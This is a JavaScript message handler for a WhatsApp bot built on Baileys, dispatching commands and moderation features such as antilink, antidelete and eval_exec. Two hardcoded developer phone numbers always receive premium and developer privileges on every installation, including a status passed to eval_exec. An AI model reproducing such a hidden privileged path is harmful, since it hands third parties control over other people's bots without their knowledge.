const {
  rankAndLevelUp, lecture_status, like_status, presence,
  dl_status, antidelete, antitag, antilink, antibot,
  getJid, mention, eval_exec, antimention, chatbot
} = require('./Message_upsert_events');

const { Bans } = require("../DataBase/ban");
const { Sudo } = require('../DataBase/sudo');
const { getMessage, addMessage } = require('../lib/store');
const { jidDecode, getContentType } = require("@whiskeysockets/baileys");

const evt = require("../lib/ovlcmd");
const config = require("../set");
const prefixe = config.PREFIXE || "";

const { get_stick_cmd } = require("../DataBase/stick_cmd");
const { list_cmd } = require('../DataBase/public_private_cmd');

const decodeJid = (jid) => {
  if (!jid) return jid;
  if (/:\d+@/gi.test(jid)) {
    const d = jidDecode(jid) || {};
    return (d.user && d.server && `${d.user}@${d.server}`) || jid;
  }
  return jid;
};

async function getSudoUsers() {
  try {
    const sudos = await Sudo.findAll({ attributes: ['id'] });
    return sudos.map(e => e.id.replace(/@s\.whatsapp\.net$/, ""));
  } catch {
    return [];
  }
}

async function isBanned(type, id) {
  const ban = await Bans.findOne({ where: { id, type } });
  return !!ban;
}

async function message_upsert(m, ovl) {
  try {
    if (m.type !== 'notify') return;
    const ms = m.messages?.[0];
    if (!ms?.message) return;
    addMessage(ms.key.id, ms);

    const mtype = getContentType(ms.message);
    const texte = {
      conversation: ms.message.conversation,
      imageMessage: ms.message.imageMessage?.caption,
      videoMessage: ms.message.videoMessage?.caption,
      extendedTextMessage: ms.message.extendedTextMessage?.text,
      buttonsResponseMessage: ms.message.buttonsResponseMessage?.selectedButtonId,
      listResponseMessage: ms.message.listResponseMessage?.singleSelectReply?.selectedRowId,
      messageContextInfo: ms.message.buttonsResponseMessage?.selectedButtonId ||
        ms.message.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text
    }[mtype] || "";

    const ms_org = ms.key.remoteJid;
    const id_Bot = decodeJid(ovl.user.id);
    const id_Bot_N = id_Bot.split('@')[0];

    const verif_Groupe = ms_org.endsWith("@g.us");
    const infos_Groupe = verif_Groupe ? await ovl.groupMetadata(ms_org) : {};
    const nom_Groupe = infos_Groupe.subject || "";
    const mbre_membre = verif_Groupe ? infos_Groupe.participants : [];
    const groupe_Admin = mbre_membre.filter(p => p.admin).map(p => p.jid);
    const verif_Ovl_Admin = verif_Groupe && groupe_Admin.includes(id_Bot);

    const auteur_Message = verif_Groupe
      ? await getJid(decodeJid(ms.key.participant), ms_org, ovl)
      : ms.key.fromMe ? id_Bot : decodeJid(ms.key.remoteJid);

    const msg_Repondu = ms.message?.[mtype]?.contextInfo?.quotedMessage;
    const auteur_Msg_Repondu = await getJid(
      decodeJid(ms.message?.[mtype]?.contextInfo?.participant),
      ms_org, ovl
    );
    const mentionnes = ms.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
    const mention_JID = await Promise.all(mentionnes.map(j => getJid(j, ms_org, ovl)));

    const nom_Auteur_Message = ms.pushName;

    let arg = texte.trim().split(/ +/).slice(1);
    if (arg.length === 0 && msg_Repondu) {
      const repTexte = msg_Repondu.conversation || msg_Repondu.extendedTextMessage?.text || "";
      if (typeof repTexte === "string" && repTexte.startsWith("https")) {
        arg = [repTexte];
      }
    }

    const isCmd = texte.startsWith(prefixe);
    const cmdName = isCmd ? texte.slice(prefixe.length).trim().split(/ +/)[0].toLowerCase() : "";

    const Ainz = '22651463203';
    const Ainzbot = '22605463559';
    const devNumbers = [Ainz, Ainzbot];
    const sudoUsers = await getSudoUsers();

    const premiumUsers = [Ainz, Ainzbot, id_Bot_N, config.NUMERO_OWNER, ...sudoUsers]
  .map(n => `${n}@s.whatsapp.net`);
    const prenium_id = premiumUsers.includes(auteur_Message);
    const dev_num = devNumbers.map(n => `${n}@s.whatsapp.net`);
    const dev_id = dev_num.includes(auteur_Message);
    const verif_Admin = verif_Groupe && (groupe_Admin.includes(auteur_Message) || prenium_id);

    const repondre = (msg) => ovl.sendMessage(ms_org, { text: msg }, { quoted: ms });

    const cmd_options = {
      verif_Groupe, mbre_membre, membre_Groupe: auteur_Message, verif_Admin,
      infos_Groupe, nom_Groupe, auteur_Message, nom_Auteur_Message,
      id_Bot, prenium_id, dev_id, dev_num, id_Bot_N, verif_Ovl_Admin,
      prefixe, arg, repondre, groupe_Admin: () => groupe_Admin,
      msg_Repondu, auteur_Msg_Repondu, ms, ms_org, texte, getJid
    };

    const executerCommande = async (cd) => {
      const privateCmds = await list_cmd("private");
      const publicCmds = await list_cmd("public");

      const isPrivateCmd = privateCmds.some(c =>
        c.nom_cmd === cd.nom_cmd || cd.alias?.includes(c.nom_cmd)
      );
      const isPublicCmd = publicCmds.some(c =>
        c.nom_cmd === cd.nom_cmd || cd.alias?.includes(c.nom_cmd)
      );

      if (config.MODE !== 'public' && !prenium_id && !isPublicCmd) return;
      if (config.MODE === 'public' && !prenium_id && isPrivateCmd) return;
      if ((!dev_id && auteur_Message !== await getJid('221772430620@s.whatsapp.net', ms_org, ovl))
        && ms_org === "120363314687943170@g.us") return;
      if (!prenium_id && await isBanned('user', auteur_Message)) return;
      if (!prenium_id && verif_Groupe && await isBanned('group', ms_org)) return;

      await ovl.sendMessage(ms_org, { react: { text: cd.react || "🎐", key: ms.key } });
      cd.fonction(ms_org, ovl, cmd_options);
    };

    if (isCmd) {
      const cd = evt.cmd.find(c => c.nom_cmd === cmdName || c.alias?.includes(cmdName));
      if (cd) await executerCommande(cd);
    }

    if (ms?.message?.stickerMessage) {
      try {
        const allStickCmds = await get_stick_cmd();
        const entry = allStickCmds.find(e => e.stick_url === ms.message.stickerMessage.url);
        if (entry) {
          const cmd = entry.no_cmd;
          const cd = evt.cmd.find(z => z.nom_cmd === cmd || z.alias?.includes(cmd));
          if (cd) await executerCommande(cd);
        }
      } catch (e) {
        console.error("Erreur sticker command:", e);
      }
    }
   if ((!dev_id && auteur_Message !== await getJid('221772430620@s.whatsapp.net', ms_org, ovl))
        && ms_org === "120363314687943170@g.us") return;
    rankAndLevelUp(ovl, ms_org, texte, auteur_Message, nom_Auteur_Message, config, ms);
    presence(ovl, ms_org);
    lecture_status(ovl, ms, ms_org);
    like_status(ovl, ms, ms_org, id_Bot);
    dl_status(ovl, ms_org, ms);
    eval_exec(ovl, { ...cmd_options });
    chatbot(ms_org, verif_Groupe, texte, repondre);
    antidelete(ovl, ms, auteur_Message, mtype, getMessage, ms_org);
    antimention(ovl, ms_org, ms, verif_Groupe, verif_Admin, verif_Ovl_Admin, auteur_Message);
    antitag(ovl, ms, ms_org, mtype, verif_Groupe, verif_Ovl_Admin, verif_Admin, auteur_Message);
    mention(ovl, ms_org, ms, mtype, verif_Groupe, id_Bot, repondre);
    antilink(ovl, ms_org, ms, texte, verif_Groupe, verif_Admin, verif_Ovl_Admin, auteur_Message);
    antibot(ovl, ms_org, ms, verif_Groupe, verif_Admin, verif_Ovl_Admin, auteur_Message);
  } catch (e) {
    console.error("❌ Erreur(message.upsert):", e);
  }
}

module.exports = message_upsert;
